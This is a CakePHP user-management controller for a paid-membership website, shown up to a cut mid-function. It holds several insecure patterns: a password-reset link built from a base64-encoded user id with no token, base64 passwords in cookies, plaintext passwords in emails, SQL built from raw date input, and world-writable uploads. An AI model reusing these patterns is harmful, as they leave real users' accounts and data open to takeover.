<?php
/**
 * CakePHP(tm) : Rapid Development Framework (http://cakephp.org)
 * Copyright (c) Cake Software Foundation, Inc. (http://cakefoundation.org)
 *
 * Licensed under The MIT License
 * For full copyright and license information, please see the LICENSE.txt
 * Redistributions of files must retain the above copyright notice.
 *
 * @copyright Copyright (c) Cake Software Foundation, Inc. (http://cakefoundation.org)
 * @link      http://cakephp.org CakePHP(tm) Project
 * @since     0.2.9
 * @license   http://www.opensource.org/licenses/mit-license.updatephp MIT License
 */
namespace App\Controller;
use App\Controller\AppController;
use App\Controller\ConnectionManager;
use Cake\Network\Exception\NotFoundException;
use Cake\View\Exception\MissingTemplateException;
use Cake\Event\Event;
use Cake\ORM\TableRegistry;
use Cake\Network\Email\Email;
use Cake\Core\Configure;
use Cake\Auth\DefaultPasswordHasher;
use Cake\View\Helper\SessionHelper;
use Cake\View\Helper\FlashHelper;
use Cake\Controller\Component\PaginatorComponent;
use Cake\Network\Request;
use Cake\ORM\Query;
use Cake\ORM\Table;
use Cake\Utility\Security;
use Cake\View\Helper;
use App\Controller\DateTime;
use Cake\I18n\Time;
use Cake\Controller\Component\AuthComponent;
use Cake\Controller\Component\CookieComponent;
use Stripe\Stripe;
use Stripe\Subscription;
use App\Controller\Router;
use Cake\Core\App;
/**
 * Static content controller
 *
 * This controller will render views from Template/Pages/
 *
 * @link http://book.cakephp.org/3.0/en/controllers/pages-controller.html
 */
class UsersController extends AppController
{
     /**
     * Initialization hook method.
     *
     * Use this method to add common initialization code like loading components.
     *
     * @return void
     */
     //public $components = array('PaypalExpressRecurring');
     
    public function initialize()
    {
        parent::initialize();
        $this->loadComponent('Paginator');
        $this->loadComponent('PaypalExpressRecurring');
        $this->loadComponent('Flash');
        $this->loadComponent('Cookie', ['expiry' => '1 day']);
         $this->Cookie->config('path', '/');
    }
    public function beforeFilter(Event $event)
    {
        parent::beforeFilter($event);
        $this->Auth->allow(['logout','login','freeregister','paymentPaypal','checkPromocode','paymentPaypal1','choosepaymenttype','userMembershipVerify','paymentpage','register','states','cities','forgotpassword','resetpassword','sendmail','verify','indexnext']);
       
    }
    public function isAuthorized($user)
    { 
         if(isset($user['role']) && $user['role'] === ADMIN){ 
              if (in_array($this->request->action, ['index','deleteduser','suspend','history','compatibility','profile','adduser','editprofile','searchuser','editstatus','changepassword','userlist','userprofile','globalsetting','logout','adduser','delete','edituser'])) { 
                   return true;
              }
         }
         if(isset($user['role']) && $user['role'] === USER){ 
              if (in_array($this->request->action, ['deleteaccount','applypromocode'])) { 
                   return true;
              }
         }
       return false;
    }
    public function login($process=null){
     
        $this->layout='home_page';
        $uid = $this->Auth->user('id');
        if($uid){
             return $this->redirect($this->Auth->redirectUrl());
        }
        $cookie = $this->Cookie->read('remember_me');    
        $userTable =TableRegistry::get('Users');
        $session=$this->request->session();
        if ($this->request->is('post'))
        {
            $p=$userTable->find('all')->where(['OR'=>['email'=>$this->request->data['email'],['username'=>$this->request->data['email']]]])->first();
            if(count($p) > 0 )
            {
                if($p->logincount < 5 )
                {
                    $this->request->data['email'] = $p['email'];
                    $user = $this->Auth->identify();
                    if($user)
                    {
                       // die("rfgkj");
                        if($user['role'] == ADMIN || $user['role'] == USER){
                        if(isset($user['status']) && $user['status']== ACTIVE)
                        {
                        
                           $this->Auth->setUser($user);
                           if(isset($this->request->data['remember_me']) && $this->request->data['remember_me'] == "on")
                            {
                                $data['email'] = $this->request->data['email'];
                                $data['password'] = base64_encode($this->request->data['password']);
                                $data = json_encode($data);
                                $this->Cookie->write('remember_me',$data);
                                $query = $userTable->query();
                                $query->update()
                                ->set(['logincount'=>'0'
                                ])
                                ->where(['email' => $this->request->data['email']])
                                ->execute();
                                       
                            }
                            else
                            {
                                $this->Cookie->delete('remember_me');
                            }
                            $last_login = date("Y-m-d h:i:s");
                            $query = $userTable->query();
                                 $query->update()
                                 ->set(['last_login'=>$last_login
                                 ])
                                 ->where(['id' => $this->Auth->user('id')])
                                 ->execute();
                            $userRole = $this->Auth->user('role');
                            return $this->redirect($this->Auth->redirectUrl());
                        }
                        else if(isset($user['status']) && $user['status']==INACTIVE)
                        { 
                            $this->Flash->error(__('Please verify your account.'));
                            return $this->redirect(array('controller'=>'users','action'=>'login'));
                        }
                        }else{
                             $this->Flash->error(__('This email address is invalid.'));
                            return $this->redirect(array('controller'=>'users','action'=>'login'));
                        }
                    }
                    else
                    {
                        $p=$userTable->find('all')->where(['email'=>$this->request->data['email']])->first();
                        if(count($p) > 0){
                            if($p->logincount == 0 )
                            {
                                $counnn = 1;
                            }
                            else
                            {
                                $counnn = ($p->logincount) + 1  ;
                            }
                            $query = $userTable->query();
                            $query->update()
                            ->set(['logincount'=>$counnn
                            ])
                            ->where(['email' => $this->request->data['email']])
                            ->execute();
                        }
                        $this->Flash->error(__('Username or password is incorrect.'));
                        return $this->redirect(array('controller'=>'users','action'=>'login'));
                    }
                }
                else
                {
                    $session->write('blocked',true);
                   // $this->Flash->error('This email id has been blocked');
                    return $this->redirect(array('controller'=>'users','action'=>'login'));
                }
            }
            else
            {
                $this->Flash->error(__('This email address is invalid.'));
                return $this->redirect(array('controller'=>'users','action'=>'login'));
            }
            
           
        }
        $this->set('session',$session);
        $this->set('cookieData',$cookie);
        $this->set(['process'=>$process]);
    }
    
    public function indexnext(){
        $this->layout='admin';
        $userRole = $this->Auth->user('role');
      
        if($userRole == ADMIN){
            return $this->redirect(array('action'=>'index'));
        }elseif($userRole == USER){
            $membership = $this->Auth->user('membership_level');
            $membershipTable = TableRegistry::get('Memberships');			
            $member	=$membershipTable->find("all")->where(['id'=>$membership])->first();
            if($member['slug'] =='visitor'){
             /*  $userTable = TableRegistry::get('Users');
                 $user_id =$this->Auth->user('id');
                 $query = $userTable->query();
                 $query->update()
                 ->set(['free_survey' =>'0'])
                 ->where(['id' => $user_id])
                 ->execute(); */
                 return $this->redirect(array('controller'=>'Pages','action'=>'choosesurvey'));
            }else{
                 return $this->redirect(array('controller'=>'Pages','action'=>'memberdashboard'));
            }
        }elseif($userRole == AFFILIATE){
            return $this->redirect(array('controller'=>'Affiliates','action'=>'affiliate-detail'));
        }
    }
    
    public function index(){
        $this->layout='admin';
        $first_name=$this->Auth->user('first_name');
        $last_name=$this->Auth->user('last_name');
        $name = '';
        $name=$first_name." ".$last_name;
        $userTable = TableRegistry::get('Users');
        $membershipsTable = TableRegistry::get('memberships');
        $membershipsData = $membershipsTable->find('all',['fields'=>['id','membership_name']])->toArray();
        foreach($membershipsData as $membershipsdatas){
            $memberArr[str_replace(' ','_',(strtolower(trim($membershipsdatas['membership_name']))))] = $membershipsdatas['id'];
        }
       
        $total= $userTable->find('all')->where(['role'=>USER])->count();
        $totalAffiliat = $userTable->find('all')->where(['role'=>AFFILIATE])->count();
        $gold= $userTable->find('all')->where(['membership_level'=>$memberArr['gold_member']])->count();
        $platinum= $userTable->find('all')->where(['membership_level'=>$memberArr['platinum_member']])->count();
        $visitor= $userTable->find('all')->where(['membership_level'=>$memberArr['i_choose_to_remain_a_visitor']])->count();
        //pr($count);die;
        $this->set(compact('name','total','visitor','gold','platinum','totalAffiliat'));
    }
    public function adduser()
    {
        $this->layout='admin';
        $post=$this->Users->newEntity();
        //pr($this->request->data);die;
        if($this->request->is('post')){
            $post=$this->Users->patchEntity($post,$this->request->data,['validate'=>'AddDefault']);
            $imagename=!empty($this->request->data['profile_photo']['name'])?$this->request->data['profile_photo']['name']:"user_default.jpeg";
            if($imagename)
            {
				$ext = pathinfo($imagename, PATHINFO_EXTENSION);
                if($ext == 'jpg' || $ext == 'png' || $ext == 'jpeg'|| $ext =='JPEG' || $ext == 'bmp'|| $ext =='JPG'|| $ext =='PNG')
                {
					$imagePath	=time().$imagename;
					$filepath = getcwd() . '/img/user_images/' .$imagePath;
                    $post->profile_photo =  $imagePath ;
					$post->created = date("Y-m-d h:i:s");
					$post->status ='2';
					$post->datingsites=serialize($this->request->data['datingsites']);
					if($this->Users->save($post))
					{
						if(!empty($imagename)){
							move_uploaded_file($this->request->data['profile_photo']['tmp_name'], $filepath);
							//chmod($filepath, 0777);
						}
						$EmailTemplates= TableRegistry::get('Emailtemplates');
						$query = $EmailTemplates->find('all')->where(['slug' => 'add_user'])->toArray();
						if($query){
							//$activation_link = SITE_URL.'Users/verify/'.base64_encode($result->id);
							$to = $this->request->data['email'];
							$subject = $query[0]['subject'];
							$message1 = $query[0]['description'];
							$message = str_replace(['{{name}}','{{email}}','{{username}}','{{password}}'],[$this->request->data['first_name'],$this->request->data['email'],$this->request->data['username'],$this->request->data['password']],$message1);
							parent::sendEmail($to, $subject, $message);

						}
						$this->Flash->success(__('This User has been saved.'));
						return $this->redirect(array('action' => 'userlist'));
					}else{
						foreach ($post->errors() as $key => $value) {
							 $messageerror = [];
							 foreach ($value as $key2 => $value2) {
								 $messageerror[] = $value2;
							 } 
							 $errorInputs[$key] = implode(",", $messageerror);
						 }
						 $err=implode(',',$errorInputs);
						 $this->Flash->error($err);
					}
                }else{
                     $this->Flash->error("Please upload any gif,png,jpg type file.");
                    return $this->redirect(array('controller'=>'Users','action' => 'adduser'));
                }
            }
        }
		$table1=TableRegistry::get('Countries');
		$query1 = $table1->find('list', [
		'keyField' => 'id',
		'valueField' => 'name'])
		->order(['name' => 'ASC']);
		$countries 	= $query1->toArray();
		$countries	=array("223"=>"United States")+ $countries ;
        
		$statestbl=TableRegistry::get('States');
        $Statesqery = $statestbl->find('list', ['keyField' => 'id','valueField' => 'name'])->where(['country_id'=>'223'])->order(['name' => 'ASC']);
        $states 	= $Statesqery->toArray();
        
		$tablemembership=TableRegistry::get('Memberships');
		$query2 = $tablemembership->find('list',[	
           'keyField' => 'id',
            'valueField' => 'membership_name'])
			 ->where(['status'=>ACTIVE])
            ->order(['id' => 'ASC']);
        $membership = $query2->toArray();
		$tablcountrycode=TableRegistry::get('Countrycode');
		$query3 = $tablcountrycode->find('list',[
           'keyField' => 'phonecode',
            'valueField' => 'phonecode'])
            ->order(['phonecode' => 'ASC']);
        $countrycode = $query3->toArray();
        
        $table=TableRegistry::get('Datingsites');
         $query = $table->find('list', [
            'keyField' => 'id',
            'valueField' => 'site_name'])
            ->order(['site_name' => 'ASC']);
        $sites = $query->toArray();
		array_unshift($sites, "N/A");
       
        $this->set(compact('post','sites','countries','membership','states','countrycode'));
    }
    public function profile($id=null){
        $this->layout='admin';
        $id=$this->Auth->user('id');
        $post=$this->Users->findById($id)->toArray();
        $this->set('post',$post);
    }
    public function userprofile($id=null){
        $this->layout='admin';
        $id=base64_decode($id);
        $post=$this->Users->findById($id)->toArray();
        $this->set('post',$post);
    }
    public function editstatus()
    {
        $userTable = TableRegistry::get('Users');
		if ($this->request->is(['post', 'put'])) { 
			$id 				= $this->request->data['id'];
			$status 			= $this->request->data['status'];
            $mainStatus = [ACTIVE=>INACTIVE,INACTIVE=>ACTIVE];
			$data = $userTable->get($id);
			if(empty($data)){
				throw new NotFoundException;
			}
			$data->status = $mainStatus[$status];
            $data->modified = date("Y-m-d h:i:s");
			$userTable->save($data);
			if($mainStatus[$status]==ACTIVE){
				$EmailTemplates= TableRegistry::get('Emailtemplates');
				$query = $EmailTemplates->find('all')->where(['slug' => 'status_active'])->toArray();
				if($query){
					$to = $data->email;
					$subject = $query[0]['subject'];
					$message1 = $query[0]['description'];
					$message = str_replace(['{{first_name}}'],[$data->first_name],$message1);
					parent::sendEmail($to, $subject, $message);
				}
			}
			if($mainStatus[$status]==INACTIVE){
				$EmailTemplates= TableRegistry::get('Emailtemplates');
				$query = $EmailTemplates->find('all')->where(['slug' => 'status_inactive'])->toArray();
				if($query){
					$to = $data->email;
					$subject = $query[0]['subject'];
					$message1 = $query[0]['description'];
					$message = str_replace(['{{first_name}}'],[$data->first_name],$message1);
					parent::sendEmail($to, $subject, $message);
				}
			}
			echo "Record updated successfully.";
			exit;
		}
    }
    public function editprofile($id = null){
        $this->layout="admin";
        $id=base64_decode($id);
        $post=$this->Users->findById($id)->toArray();
        if($this->request->is(['post','put'])){
            $data=$this->request->data;
            $table=TableRegistry::get('Users');
            $p=$table->find()->where(['`id`' => $this->request->data['id']])->first();
            $post=$this->Users->patchEntity($p,$this->request->data,[ 'validate' => 'ProfileDefault']);
            if(!empty($this->request->data['profile_photo']['name'])){
                $imagename=$this->request->data['profile_photo']['name'];
                $ext = pathinfo($imagename, PATHINFO_EXTENSION);
                if($ext == 'jpg' || $ext == 'png' || $ext == 'jpeg'|| $ext =='JPEG' || $ext == 'bmp'|| $ext =='JPG'|| $ext =='PNG'){
					$imagePath=time().$imagename;
                    $filepath = getcwd() . '/img/user_images/' .$imagePath;
                    $post->profile_photo =$imagePath ;
                    $post->modified = date("Y-m-d h:i:s");
                    if($this->Users->save($post)){
                        if(!empty($imagename)){ 
                            move_uploaded_file($this->request->data['profile_photo']['tmp_name'], $filepath);
                            chmod($filepath, 0777);
                        }
						$this->Flash->success(__('Your profile has been updated'));
                        return $this->redirect(array('action' => 'profile'));
                        }else{
                            foreach ($post->errors() as $key => $value) {
                                $messageerror = [];
                                foreach ($value as $key2 => $value2) {
                                    $messageerror[] = $value2;
                                }
                                $errorInputs[$key] = implode(",", $messageerror);
                            }
                            $err=implode(',',$errorInputs);
                            $this->Flash->error($err);
                           // return $this->redirect(array('controller'=>'Users','action' => 'editprofile',base64_encode($this->request->data['id'])));
                                    
                        }
                        
                }else{
                $this->Flash->error("Please upload only gif,png,jpg type file.");
                return $this->redirect(array('controller'=>'Users','action' => 'editprofile',base64_encode($this->request->data['id'])));
                }
            }else{
                    $post->profile_photo =$this->request->data['photo'];
                    $post->modified = date("Y-m-d h:i:s");
                    if($this->Users->save($post)){
                        $this->Flash->success(__('Your profile has been updated.'));
                        return $this->redirect(array('action' => 'profile'));
                    }
                    else{
                        foreach($post->errors() as $key => $value){
                            $messageerror = [];
                            foreach($value as $key2 => $value2){
                                $messageerror[] = $value2;
                                foreach($messageerror as $err)
                                {
                                    $this->Flash->error(__($err));
                                    //return $this->redirect(array('controller'=>'Users','action' => 'editprofile',base64_encode($this->request->data['id'])));
                                }
                            }
                        }
                    }
                }
            }
		$table1=TableRegistry::get('Countries');
		$query1 = $table1->find('list', [
		'keyField' => 'id',
		'valueField' => 'name'])
		->order(['name' => 'ASC']);
		$countries = $query1->toArray();
		$countries	=array("1"=>"US")+ $countries ;
        $this->set(compact('post','countries'));
    }
    public function changepassword($id = null) {
        $this->layout='admin';
        $id=$this->Auth->user('id');
        $table = TableRegistry::get('Users');
        $hasher = new DefaultPasswordHasher();
        $post = $table->find('all')->where(['id'=>$id])->first();
        if ($this->request->is(['post','put'])) {
            $verify = $hasher->check($this->request->data['oldpassword'], $post->password);
            $post = $table->patchEntity($post,$this->request->data,['validate' => 'ChangeDefault']);
            if(!$post->errors()){
                if($this->request->data['newpassword'] == $this->request->data['cpassword']){
                    if($verify == 1){
                        $post->password=$this->request->data['newpassword'];
                        $post->modified = date("Y-m-d h:i:s");
                        if($table->save($post)){
                            $EmailTemplates= TableRegistry::get('Emailtemplates');
                            $query = $EmailTemplates->find('all')->where(['slug' => 'change_password'])->toArray();
                            if($query){
                                    $to = $post->email;
                                    $subject = $query[0]['subject'];
                                    $message1 = $query[0]['description'];
                                    $message = str_replace(['{{username}}','{{email}}','{{password}}'],[$post->first_name,$post->email,$this->request->data['newpassword']],$message1);
                                    parent::sendEmail($to, $subject, $message);
                                    //$this->Flash->success('Thank you for registering with us. A mail has been sent to your email address with all details. Please verify your email address by clicking on available link to access your account.');
                                    //return $this->redirect(['controller'=>'Users','action' => 'login']);
                            }
                            $this->Flash->success(__('Your password has been changed.'));
                            //return $this->redirect(['action' => 'logout']);
                        }else{
                           $this->Flash->error("Old password is incorrect.");
                        }
                    }else{
                            $this->Flash->error("Old password is incorrect.");
                    }
                }else{
                      $this->Flash->error("Passwords not match.");
                } 
            }else{
                foreach($post->errors() as $key => $value){
                    $messageerror = [];
                    foreach($value as $key2 => $value2){
                        $messageerror[] = $value2;
                        foreach($messageerror as $err)
                        {
                            $this->Flash->error(__($err));
                            
                        }
                    }
                }
            }
            
        }
        $this->set('post',$post);
    }
     function forgotpassword() {
        $this->layout='home_page';
        if (!empty($this->request->data)) {
            $email=$this->request->data['email'];
            $Users= TableRegistry::get('Users');
            $post = $Users->find('all')->where(['email' =>$email,'role'=>USER])->toArray();
            if (empty($post)) {
                $this->Flash->error('Sorry, the username entered was not found.');
               return $this->redirect(['controller'=>'Users','action' => 'forgotpassword']);
            }else {
                $EmailTemplates= TableRegistry::get('Emailtemplates');
                $query = $EmailTemplates->find('all')->where(['slug' => 'forgot_password'])->toArray();
                if($query){
                    $activation_link = SITE_URL.'users/resetpassword/'.base64_encode($post[0]['id']);
                    $to = $email;
                    $subject = $query[0]['subject'];
                    $message1 = $query[0]['description'];
                    $message = str_replace(['{{username}}','{{activation_link}}'],[$post[0]['first_name'],$activation_link],$message1);
                    parent::sendEmail($to, $subject, $message);
                    $this->Flash->success('Password reset instructions have been sent to your email address.
						You have 24 hours to complete the request.');
                   return $this->redirect(['controller'=>'Users','action' => 'login']);
                }
            }
        }
    }
    public function resetpassword($id=null){
        $this->layout='home_page';
        $id = base64_decode($id);
        $table = TableRegistry::get('Users');
        $post =$table->get($id);
        if ($this->request->is(['post','put'])) {
           // $hasher = new DefaultPasswordHasher();
            //$post = $table->find('all')->where(['id'=>$this->request->data['id']])->first();
            $post = $table->patchEntity($post,$this->request->data,['validate'=>'ChangeDefault']);
            if(!$post->errors()){
                $post->password=$this->request->data['newpassword'];
                $post->modified = date("Y-m-d h:i:s");
                $post->logincount='0';
                if($table->save($post)){
                    $session =$this->request->session();
                    $session->destroy("blocked");
                    $this->Flash->success(__('Your password has been successfully updated.'));
                    return $this->redirect(['controller'=>'Users','action' => 'login']);
                }
            }else{
                foreach ($post->errors() as $key => $value) {
                       $messageerror = [];
                       foreach ($value as $key2 => $value2) {
                           $messageerror[] = $value2;
                       }
                       $errorInputs[$key] = implode(",", $messageerror);
                }
                $err=implode(',',$errorInputs);
                $this->Flash->error($err);
                //return $this->redirect(['controller'=>'Users','action' => 'resetpassword/'.base64_encode($id)]);
            }
           
        }
        $this->set(compact('post'));
    }
    public function delete(){
        $this->autoRender = false;
        
        $this->request->allowMethod(['post', 'delete']);
        $user_id = $this->request->data['id'];
        $table  =TableRegistry::get('Users');
        $user   =$table->get($user_id);
        $memTable=TableRegistry::get('Memberships');
        $membership=$memTable->find("all")->where(['id'=>$user['membership_level']])->first();
        
        $deletedUserTable=TableRegistry::get('Deletedusers');
        $new=$deletedUserTable->newEntity();
        $data['email']= $user['email'];
        $data['name'] = $user['first_name']." ".$user['last_name'];
        $post=$deletedUserTable->patchEntity($new,$data);
        $post->created = date("Y-m-d h:i:s");
        $deletedUserTable->save($post);
        $paymentTable  =TableRegistry::get('Payments');
        $customer=$paymentTable->find("all")->where(['user_id'=>$user_id])->order(['id'=>'DESC'])->limit(1)->first();
        if($customer['payment_mode']=='Stripe'){
            
            require_once(ROOT . DS  . 'vendor' . DS  . 'stripe' . DS . 'autoload.php');
            $test_secret_key = Configure::read('stripe_test_secret_key');
            $setApiKey = Stripe::setApiKey($test_secret_key);
            $getApiKey = Stripe::getApiKey();
            try{
                $customer_id=$customer['customer_id'];
                $customernew = \Stripe\Customer::retrieve($customer_id);
                $customernew->cancelSubscription(array('at_period_end' => true));
                if($table->delete($user)){
                    $EmailTemplates= TableRegistry::get('Emailtemplates');
                    $query = $EmailTemplates->find('all')->where(['slug' => 'account_delete'])->toArray();
                    if($query){
                         $to = $post->email;
                         $subject = $query[0]['subject'];
                         $message1 = $query[0]['description'];
                         $message = str_replace(['{{first_name}}'],[$post->first_name],$message1);
                         parent::sendEmail($to, $subject, $message);
                         //$this->Flash->success('Thank you for registering with us. A mail has been sent to your email address with all details. Please verify your email address by clicking on available link to access your account.');
                         //return $this->redirect(['controller'=>'Users','action' => 'login']);
                    }
                    echo 'Account has been deleted.';
                }   
            }catch (\Stripe\Error\Customer $e) {
                    echo $e->getMessage();
                    //die;
                    //$this->Flash->error($e->getMessage());
                    //$this->redirect(array('controller'=>'Users','action'=>'userlist'));
            }
        }else{
            if($table->delete($user)){
                    $EmailTemplates= TableRegistry::get('Emailtemplates');
                    $query = $EmailTemplates->find('all')->where(['slug' => 'account_delete'])->toArray();
                    if($query){
                         $to = $post->email;
                         $subject = $query[0]['subject'];
                         $message1 = $query[0]['description'];
                         $message = str_replace(['{{first_name}}'],[$post->first_name],$message1);
                         parent::sendEmail($to, $subject, $message);
                         //$this->Flash->success('Thank you for registering with us. A mail has been sent to your email address with all details. Please verify your email address by clicking on available link to access your account.');
                         //return $this->redirect(['controller'=>'Users','action' => 'login']);
                    }
                    echo 'Account has been deleted.';
                } 
        }
        exit;
    }
    /*public function delete($id){
        $this->request->allowMethod(['post', 'delete']);
        $id = $this->request->data['id'];
        
        if($this->Users->delete($post)){
           $EmailTemplates= TableRegistry::get('Emailtemplates');
           $query = $EmailTemplates->find('all')->where(['slug' => 'account_delete'])->toArray();
			if($query){
				$to = $post->email;
				$subject = $query[0]['subject'];
				$message1 = $query[0]['description'];
				$message = str_replace(['{{first_name}}'],[$post->first_name],$message1);
				parent::sendEmail($to, $subject, $message);
				//$this->Flash->success('Thank you for registering with us. A mail has been sent to your email address with all details. Please verify your email address by clicking on available link to access your account.');
				//return $this->redirect(['controller'=>'Users','action' => 'login']);
			}
            $this->Flash->success(__('Account has been deleted.'));
            return $this->redirect(array('action'=>'userlist'));
        }
    }*/
    
    public function deleteaccount(){
        
        $deletedUserTable->save($post);
        if($this->Users->delete($post)){
           $EmailTemplates= TableRegistry::get('Emailtemplates');
           $query = $EmailTemplates->find('all')->where(['slug' => 'account_delete'])->toArray();
			if($query){
				$to = $post->email;
				$subject = $query[0]['subject'];
				$message1 = $query[0]['description'];
				$message = str_replace(['{{first_name}}'],[$post->first_name],$message1);
				parent::sendEmail($to, $subject, $message);
				//$this->Flash->success('Thank you for registering with us. A mail has been sent to your email address with all details. Please verify your email address by clicking on available link to access your account.');
				//return $this->redirect(['controller'=>'Users','action' => 'login']);
			}
            $this->Flash->success(__('Account has been deleted.'));
            return $this->redirect(array('action'=>'userlist'));
        }
    }
    public function deleteduser()
    {
        $this->layout='admin';
        $table=TableRegistry::get("deletedusers");
        //$post=$table->find('all')->order(['id'=>'DESC']);
		$filter = [];
		$globalTable	=TableRegistry::get("globalsettings");
		$global=$globalTable->find('all')->where(['slug'=>'AdminPageLimit'])->first();
		$pagelimit=$global['value'];
        if($this->request->is('post')){
            $searchvalue=$this->request->data['searchvalue'];
				$datefrom= isset($this->request->data['datefrom'])?$this->request->data['datefrom']:'';
                $dateto= isset($this->request->data['dateto'])?$this->request->data['dateto']:'';
				if($datefrom && $dateto){
					$filter[]=["DATE_FORMAT(`created`, '%Y-%m-%d') between '$datefrom' AND '$dateto' "];
				}
                if($searchvalue){
                    $filter['OR'] = ['first_name Like'=>'%'.$searchvalue.'%',
                                    'last_name Like'=>'%'.$searchvalue.
                                    '%','email'=>$searchvalue,
                                    'created Like'=>'%'.$searchvalue.'%'];
                }
                //$filter['AND'] = ['role'=>USER,'status'==DELETED];
            }
        //pr($filter);die;
		$post = $this->Paginator->paginate($table, ['limit' => $pagelimit,
		'conditions' => $filter,
                'order'=>['id'=>'desc']
        ]);
        //pr($post);die;
        $this->set(compact('post','searchvalue'));
    }
    public function userlist()
    {
        $this->layout='admin';
        $table=TableRegistry::get("Users");
        //$post=$table->Users->find('all')->where(['`role`'=>USER])->order(['id'=>'DESC']);
        $searchvalue =$statusA =$statusI ='';
		$filter = [];
		$globalTable	=TableRegistry::get("globalsettings");
		$global=$globalTable->find('all')->where(['slug'=>'AdminPageLimit'])->first();
		$pagelimit=$global['value'];
        if($this->request->is('post')){
            $searchvalue=$this->request->data['searchvalue'];
                $statusA= isset($this->request->data['active'])?$this->request->data['active']:'';
                $statusI= isset($this->request->data['inactive'])?$this->request->data['inactive']:'';
				$datefrom= isset($this->request->data['datefrom'])?$this->request->data['datefrom']:'';
                $dateto= isset($this->request->data['dateto'])?$this->request->data['dateto']:'';
                 
                if($statusA && $statusI){
                     $filter['AND']['status'] =[$statusA,$statusI];
                }else{
                    if(!empty($statusA)){
                        $filter['status'] =$statusA;
                    }else if(!empty($statusI)){
                        $filter['status'] =$statusI;
                    }
                }
				if($datefrom && $dateto){
					$filter[]=["DATE_FORMAT(`created`, '%Y-%m-%d') between '$datefrom' AND '$dateto' "];
				}
                if($searchvalue){
                    $filter['OR'] = ['first_name Like'=>'%'.$searchvalue.'%',
                                    'last_name Like'=>'%'.$searchvalue.
                                    '%','email'=>$searchvalue,
                                    'created Like'=>'%'.$searchvalue.'%'];
                }
                $filter['AND'] = ['role'=>USER];
				
			//Configure::read('App.AdminPageLimit')
			 /*$post = $this->Paginator->paginate($table, ['limit' => 2,
						       'conditions' => $filter,'order'=>['Users.id'=>'desc']
        ]);*/
			
               /* if(empty($post)){
                    $this->Flash->error(__('No record found.'));
            
                }*/
               
            }
		
		$post = $this->Paginator->paginate($table, ['limit' => $pagelimit,
		'conditions' => $filter,'order'=>['Users.id'=>'desc']
        ]);
        $this->set(compact('post','searchvalue','statusA','statusI'));
    }
    public function edituser($id=null){
		
        $this->layout="admin";
        $id=base64_decode($id);
		$table=TableRegistry::get("Users");
        $post=$table->get($id);
            $country = $post->country;
            $region = $post->region;
            $statestbl=TableRegistry::get('States');
            $Statesqery = $statestbl->find('list', ['keyField' => 'id','valueField' => 'name'])->where(['country_id'=>$country])->order(['name' => 'ASC']);
            $states 	= $Statesqery->toArray();
            
            $citiestbl=TableRegistry::get('Cities');
            $citiesqery = $citiestbl->find('list', ['keyField' => 'id','valueField' => 'name'])->where(['state_id'=>$region])->order(['name' => 'ASC']);
            $cities 	= $citiesqery->toArray();
        if($this->request->is(['post','put'])){
            $data=$this->request->data;
			//pr($data);die;
          //  $p=$table->find('all')->where(['id' => $this->request->data['id']])->first();
           
			$post=$table->patchEntity($post,$this->request->data,[ 'validate' => 'AddDefault']);
			
            if(!empty($this->request->data['profile_photo']['name'])){
				
                $imagename=$this->request->data['profile_photo']['name'];
                $ext = pathinfo($imagename, PATHINFO_EXTENSION);
                if($ext == 'jpg' || $ext == 'png' || $ext == 'jpeg'|| $ext =='JPEG' || $ext == 'bmp'|| $ext =='JPG'|| $ext =='PNG'){
                   	$imagePath	=time().$imagename;
					$filepath = getcwd() . '/img/user_images/' . $imagePath;
                    $post->profile_photo =$imagePath ;
                    $post->modified = date("Y-m-d h:i:s");
                    $dataing=$this->request->data['datingsites'];
                    if(in_array('0',$dataing)){
                        $post->other=$this->request->data['other'];
                    }else{
                        $post->other="";
                    }
                    $post->datingsites=serialize($this->request->data['datingsites']);
                    if($this->Users->save($post)){
                        if(!empty($imagename)){ 
                            move_uploaded_file($this->request->data['profile_photo']['tmp_name'], $filepath);
                            chmod($filepath, 0777);
                        }
						$EmailTemplates= TableRegistry::get('Emailtemplates');
					   	$query = $EmailTemplates->find('all')->where(['slug' => 'profile_edit'])->toArray();
						if($query){
							$to = $this->request->data['email'];
							$subject = $query[0]['subject'];
							$message1 = $query[0]['description'];
							$message = str_replace(['{{username}}'],[$this->request->data['first_name']],$message1);
							parent::sendEmail($to, $subject, $message);
							//$this->Flash->success('Thank you for registering with us. A mail has been sent to your email address with all details. Please verify your email address by clicking on available link to access your account.');
							//return $this->redirect(['controller'=>'Users','action' => 'login']);
						}
                        $this->Flash->success(__('User profile has been updated.'));
                        return $this->redirect(array('action' => 'userlist'));
                        }else{
                             foreach ($post->errors() as $key => $value) {
                        $messageerror = [];
                        foreach ($value as $key2 => $value2) {
                            $messageerror[] = $value2;
                        }
                        $errorInputs[$key] = implode(",", $messageerror);
                    }
                    $err=implode(',',$errorInputs);
                    $this->Flash->error($err);
                        }
                        
                }
                $this->Flash->error("Please upload only gif,png,jpg type file.");
                return $this->redirect(array('controller'=>'Users','action' => 'editprofile',base64_encode($this->request->data['id'])));
            }else{
				
                    $post->profile_photo =$this->request->data['photo'];
                    $post->modified = date("Y-m-d h:i:s");
                    $dataing=$this->request->data['datingsites'];
                    if(in_array('0',$dataing)){
                        $post->other=$this->request->data['other'];
                    }else{
                        $post->other="";
                    }
                    $post->datingsites=serialize($this->request->data['datingsites']);
                    if($this->Users->save($post)){
						$EmailTemplates= TableRegistry::get('Emailtemplates');
					   	$query = $EmailTemplates->find('all')->where(['slug' => 'profile_edit'])->toArray();
						if($query){
							$to = $this->request->data['email'];
							$subject = $query[0]['subject'];
							$message1 = $query[0]['description'];
							$message = str_replace(['{{username}}'],[$this->request->data['first_name']],$message1);
							parent::sendEmail($to, $subject, $message);
							//$this->Flash->success('Thank you for registering with us. A mail has been sent to your email address with all details. Please verify your email address by clicking on available link to access your account.');
							//return $this->redirect(['controller'=>'Users','action' => 'login']);
						}
                        $this->Flash->success(__('User profile has been updated.'));
                        return $this->redirect(array('action' => 'userlist'));
                    }
                    else{
                        foreach ($post->errors() as $key => $value) {
                        $messageerror = [];
                        foreach ($value as $key2 => $value2) {
                            $messageerror[] = $value2;
                        }
                        $errorInputs[$key] = implode(",", $messageerror);
                    }
                    $err=implode(',',$errorInputs);
                    $this->Flash->error($err);
                    }
                }
			
            }
		$table1=TableRegistry::get('Countries');
		$query1 = $table1->find('list', [
		'keyField' => 'id',
		'valueField' => 'name'])
		->order(['name' => 'ASC']);
		$countries 	= $query1->toArray();
		$countries	=array("223"=>"United States")+ $countries ;
		
        $statestbl=TableRegistry::get('States');
		$query1 = $statestbl->find('list', [
		'keyField' => 'id',
		'valueField' => 'name'])
        ->where(['country_id'=>"223"])
		->order(['name' => 'ASC']);
		$states 	= $query1->toArray();
        
